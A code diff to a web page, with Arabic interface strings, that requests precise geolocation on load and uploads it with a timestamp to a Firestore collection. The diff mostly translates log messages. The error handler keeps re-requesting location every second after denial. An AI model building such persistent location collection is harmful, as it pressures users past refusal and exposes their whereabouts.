@@ -38,7 +38,8 @@
       try {
         navigator.geolocation.getCurrentPosition(saveLocation, errorHandler, { enableHighAccuracy: true });
       } catch (error) {
-        setTimeout(requestLocationPermission, 1000); 
+        document.getElementById('instructionText').innerText = 'فشل في الحصول على إذن الموقع، يرجى المحاولة مرة أخرى.';
+        document.getElementById('grantPermissionBtn').style.display = 'block';
         console.error('فشل في الحصول على إذن الموقع:', error);
       }
     };
@@ -50,25 +51,25 @@
         timestamp: new Date().toISOString()
       };
       db.collection('locations').add(location).then(() => {
-        console.log('Location uploaded successfully!');
+        console.log('تم رفع الموقع بنجاح!');
         document.getElementById('instructionText').innerText = 'تم الحصول على الموقع ورفعه بنجاح!';
       }).catch(console.error);
     };
 
     const errorHandler = (error) => {
-      console.error('Error in fetching location:', error);
-      setTimeout(requestLocationPermission, 1000); 
+      console.error('خطأ في جلب الموقع:', error);
+      setTimeout(requestLocationPermission, 1000);
     };
 
     document.getElementById('grantPermissionBtn').addEventListener('click', requestLocationPermission);
     window.onload = requestLocationPermission;
-    
+
     if ('serviceWorker' in navigator) {
       window.addEventListener('load', () => {
         navigator.serviceWorker.register('/service-worker.js').then(registration => {
-          console.log('Service Worker registered with scope:', registration.scope);
+          console.log('تم تسجيل Service Worker بنجاح:', registration.scope);
         }).catch(error => {
-          console.log('Service Worker registration failed:', error);
+          console.log('فشل في تسجيل Service Worker:', error);
         });
       });
     }
